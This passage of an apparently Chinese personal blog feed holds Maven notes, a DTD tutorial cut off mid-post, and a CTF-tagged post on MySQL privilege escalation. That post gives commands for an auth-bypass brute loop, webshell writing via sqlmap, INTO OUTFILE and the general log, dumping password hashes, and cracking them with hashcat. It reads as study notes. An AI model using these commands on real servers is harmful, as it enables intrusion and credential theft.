title="仓库分类"></a>仓库分类</h3><ul><li>本地</li><li>远程</li><li>中央（全球唯一）</li></ul><h3 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1h6q0o88p57j316o0ocacq.jpg" alt="image-20221001193432984"></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li>mvn compile<ul><li>编译产生target文件夹</li></ul></li><li>mvn clean <ul><li>清除target</li></ul></li><li>mvn package（若没编译会自动编译）<ul><li>打包成war包</li></ul></li><li>mvn install <ul><li>将项目安装到本地仓库</li></ul></li></ul><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q0x7k6b6j31ei0dgt9q.jpg" alt="image-20221001194313507"></p><blockquote><p>上面是三个生命周期，中间是最常用的</p></blockquote><h3 id="坐标"><a href="#坐标" class="headerlink" title="坐标"></a>坐标</h3><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q16smnrlj30q207cq3n.jpg" alt="image-20221001195226310"></p><blockquote><p>groupld利用.分隔每层目录 </p><p>e.g. javax.servlet.jsp在仓库中是目录 javax/servlet/jsp</p><p>atifactld就是要导的包的文件夹了，先点进去里面一层一般是多个版本的文件夹</p><p>再在version里选择版本号</p><p>同理也可以导插件</p></blockquote><h3 id="骨架-模版"><a href="#骨架-模版" class="headerlink" title="骨架/模版"></a>骨架/模版</h3><p>archetype</p><p>webapp--web项目。quickstart--java项目</p><blockquote><p>自动创建webapp那一类模版</p></blockquote><p>不使用骨架直接创maven项目的话，java项目src/main下只有java和resources (test目录下只有java)</p><p>web项目src/main下有java和resources/webapp</p><blockquote><p>可以在test里面自己手动创建resources，然后右击选择</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q1uanbk0j30z405idgn.jpg" alt="image-20221001201501803"></p></blockquote><h3 id="一些配置教训"><a href="#一些配置教训" class="headerlink" title="一些配置教训"></a>一些配置教训</h3><p>注意版本对应</p><p>如果是2021.3的idea，不要使用高版本maven，应使用3.5.4</p><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>第一次引入会因为没有下载而爆红，点击刷新即可</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6qv5pcwoaj30k80w6mxv.jpg" alt="image-20221002130921594"></p><h3 id="pom-xml增加plugin"><a href="#pom-xml增加plugin" class="headerlink" title="pom.xml增加plugin"></a>pom.xml增加plugin</h3><p>格式：(需要在project标签内)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql提权</title>
      <link href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2022/07/08/Mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ol><li><strong>具有MySQL的root权限，且MySQL以system权限运行。</strong></li><li><strong>具有执行SQL语句的权限。</strong></li></ol><p><strong>获取root密码的方法：</strong></p><ol><li><p>MySQL 3306 端口弱口令爆破</p></li><li><p>sqlmap 注入的 <code>--sql-shell</code> 模式</p><blockquote><p>使用条件:数据库开启了shell能执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u www.xxxx/aboutus.php?<span class="hljs-built_in">id</span>=1 --sql-shell<br></code></pre></td></tr></table></figure><p>进入了交互式页面，输入 select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码</p></blockquote></li><li><p>网站的数据库配置文件中拿到明文密码信息</p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p><blockquote><p>Mysql 身份认证绕过漏洞（CVE-2012-2122）,当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<u>只要知道用户名</u>，不断尝试就能够直接登入SQL数据库。官方说法是256次会成功一次</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`; <span class="hljs-keyword">do</span> mysql -uroot -pwrong -h your-ip -P3306 ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="Webshell权限"><a href="#Webshell权限" class="headerlink" title="Webshell权限"></a>Webshell权限</h2><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><h4 id="写shell条件"><a href="#写shell条件" class="headerlink" title="写shell条件"></a>写shell条件</h4><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li>load_file() 开启 即 secure_file_priv 无限制</li><li>网站路径有写入权限</li></ul><p>首先基础语法查询是否 secure_file_priv 没有限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br></code></pre></td></tr></table></figure><blockquote><p>不同value值对应</p><table><thead><tr><th align="left">Value</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">不允许导入或导出</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td align="left">空</td><td align="left">不限制目录</td></tr></tbody></table><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以<u>向任意绝对路径写文件</u></p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p>若value为空，即不限制目录时，可以使用原生SQL语句来写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>sqlmap中做法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="hljs-string">&quot;/var/www/html/test/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h3 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h3><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更改日志文件位置</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br><br><span class="hljs-comment"># 查看当前配置</span><br>mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+-----------------------------+<br>| Variable_name    | Value                       |<br>+------------------+-----------------------------+<br>| general_log      | ON                          |<br>| general_log_file | /var/www/html/info.php |<br>+------------------+-----------------------------+<br><br><span class="hljs-comment"># 往日志里面写入 payload</span><br>select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br><span class="hljs-comment"># 此时已经写到 info.php 文件当中了</span><br>root@c1595d3a029a:/var/www/html/$ <span class="hljs-built_in">cat</span> info.php <br>/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:<br>Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock<br>Time                 Id Command    Argument<br>201031 21:14:46       40 Query    SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span><br>201031 21:15:34       40 Query    select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php<br></code></pre></td></tr></table></figure><p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。</p><h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># MySQL &lt;= 5.6 版本</span><br>mysql&gt; select host, user, password from mysql.user;<br><br><span class="hljs-comment"># MySQL &gt;= 5.7 版本</span><br>mysql&gt; select host,user,authentication_string from mysql.user;<br></code></pre></td></tr></table></figure><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>在线网站来解密，如国内的 CMD5</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h21dwwaf21j214808y3ze.jpg" alt="img"></p><p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -a 0 -m 300 --force <span class="hljs-string">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27;</span> password.txt -O<br></code></pre></td></tr></table></figure><p><strong>-a 破解模式</strong></p><p>指定要使用的破解模式，其值参考后面对参数</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">-</span> <span class="hljs-punctuation">[</span> Attack Modes <span class="hljs-punctuation">]</span> <span class="hljs-operator">-</span><br><br>  <span class="hljs-comment"># | Mode</span><br> <span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-operator">+</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><br>  <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Straight                <span class="hljs-comment"># 直接字典破解</span><br>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Combination             <span class="hljs-comment"># 组合破解</span><br>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Brute<span class="hljs-operator">-</span>force             <span class="hljs-comment"># 掩码暴力破解</span><br>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> Hybrid Wordlist <span class="hljs-operator">+</span> Mask  <span class="hljs-comment"># 字典+掩码破解</span><br>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> Hybrid Mask <span class="hljs-operator">+</span> Wordlist  <span class="hljs-comment"># 掩码+字典破解</span><br></code></pre></td></tr></table></figure><p><strong>-m 破解hash类型</strong></p><p>指定要破解的hash类型，后面跟hash类型对应的数字，具体类型详见下表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">12   | PostgreSQL                                       | Database Server<br>131  | MSSQL (2000)                                     | Database Server<br>132  | MSSQL (2005)                                     | Database Server<br>1731 | MSSQL (2012, 2014)                               | Database Server<br>200  | MySQL323                                         | Database Server<br>300  | MySQL4.1/MySQL5                                  | Database Server<br>...<br></code></pre></td></tr></table></figure><p><strong>–force</strong></p><p>忽略破解过程中的警告信息</p><p><strong>-O</strong></p><p><code>--optimized-kernel-enable</code> 启用优化的内核（限制密码长度</p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>用户通过自定义函数，使得在SQL语句中调用新函数</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();   # 获取数据库版本<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();  # 获取数据库用户<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;   # 获取数据库安装目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>plugin<span class="hljs-operator">%</span>’; # 查看plugin路径。<br></code></pre></td></tr></table></figure><h3 id="动态链接库写入函数"><a href="#动态链接库写入函数" class="headerlink" title="动态链接库写入函数"></a>动态链接库写入函数</h3><ul><li><strong>sqlmap 的 UDF 动态链接库文件位置</strong>(sqlmap的动态链接库需要使用自带解码工具cloak.py解码)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><ul><li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF 根目录/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure><p>寻找插件目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>+---------------+------------------------------+<br>| Variable_name | Value                        |<br>+---------------+------------------------------+<br>| plugin_dir    | /usr/local/mysql/lib/plugin/ |<br>+---------------+------------------------------+<br></code></pre></td></tr></table></figure><p>写入动态数据库</p><p>坑，待补</p><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DTD学习</title>
      <link href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p><p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p><h3 id="内部DOCTYPE声明"><a href="#内部DOCTYPE声明" class="headerlink" title="内部DOCTYPE声明"></a>内部DOCTYPE声明</h3><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE 根元素 [元素声明]&gt;  &lt;!--根元素是xml文件的根元素--&gt;<br></code></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note [<br>  &lt;!ELEMENT note (to,from,heading,body)&gt;<br>  &lt;!ELEMENT to      (#PCDATA)&gt;<br>  &lt;!ELEMENT from    (#PCDATA)&gt;<br>  &lt;!ELEMENT heading (#PCDATA)&gt;<br>  &lt;!ELEMENT body    (#PCDATA)&gt;<br>]&gt;<br>&lt;note&gt;<br>  &lt;to&gt;George&lt;/to&gt;<br>  &lt;from&gt;John&lt;/from&gt;<br>  &lt;heading&gt;Reminder&lt;/heading&gt;<br>  &lt;body&gt;Do not forget the meeting!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h3><p><em>!DOCTYPE note</em> (第二行)定义此文档是 <em>note</em> 类型的文档。</p><p><em>!ELEMENT note</em> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p><p><em>!ELEMENT to</em> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT from</em> (第五行)定义 <em>from</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT heading</em> (第六行)定义 <em>heading</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT body</em> (第七行)定义 <em>body</em> 元素为 “#PCDATA” 类型</p></blockquote><h3 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h3><p>DTD位于XML源文件外部,语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;<br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;<br>&lt;note&gt;<br>&lt;to&gt;George&lt;/to&gt;<br>&lt;from&gt;John&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;Do not forget the meeting!&lt;/body&gt;<br>&lt;/note&gt; <br></code></pre></td></tr></table></figure><p>包含的note.dtd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT heading (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><p>通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。</p><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><h2 id="构建模块"><a href="#构建模块" class="headerlink" title="构建模块"></a>构建模块</h2><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>由闭合标签及内容(文本或空)构成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>body text in between<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>some message in between<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>提供<em>有关元素的额外信息</em>。</p><p>元素为空时</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;computer.gif&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>元素有内容时</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> <span class="hljs-attr">sex</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Anna<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Smith<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">person</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><p><strong>下面的实体在 XML 中被预定义</strong></p><table><thead><tr><th align="left">实体引用</th><th align="left">字符</th></tr></thead><tbody><tr><td align="left"><code>&amp;lt;</code></td><td align="left">&lt;</td></tr><tr><td align="left"><code>&amp;gt;</code></td><td align="left">&gt;</td></tr><tr><td align="left"><code>&amp;amp;</code></td><td align="left">&amp;</td></tr><tr><td align="left"><code>&amp;quot;</code></td><td align="left">“</td></tr><tr><td align="left"><code>&amp;apos;</code></td><td align="left">‘</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是会被解析的字符数据（parsed character data）,字符数据就是闭合标签之间的文本内容</p><p><strong>这些文本将被解析器检查实体以及标记。</strong>文本中的标签会被当作标记来处理，而实体会被展开。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>此文本也会被解析<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据（character data）。<em>CDATA 是不会被解析器解析的文本。</em>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>CDATA 部分由 <code>&lt;![CDATA[</code> 开始，由<code>]]&gt;</code> 结束：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span><br><span class="language-xml"><span class="language-handlebars">function matchwo(a,b)</span></span><br><span class="language-xml"><span class="language-handlebars">&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">if (a &lt; b &amp;&amp; a &lt; 0) then</span></span><br><span class="language-xml"><span class="language-handlebars">  &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">  return 1;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">else</span></span><br><span class="language-xml"><span class="language-handlebars">  &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">  return 0;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分。</p><p>标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或折行。</p></blockquote><h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">1⃣️&lt;!ELEMENT 元素名称 类别&gt;<br>2⃣️&lt;!ELEMENT 元素名称 (元素内容)&gt;<br></code></pre></td></tr></table></figure><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>利用关键字<code>EMPTY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ELEMENT 元素名称 EMPTY&gt;<br></code></pre></td></tr></table></figure><p>案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!--dtd中声明--&gt;<br>&lt;!ELEMENT br EMPTY&gt;<br>&lt;!--XML中--&gt;<br>&lt;br /&gt;<br></code></pre></td></tr></table></figure><h3 id="只有PCDATA的元素"><a href="#只有PCDATA的元素" 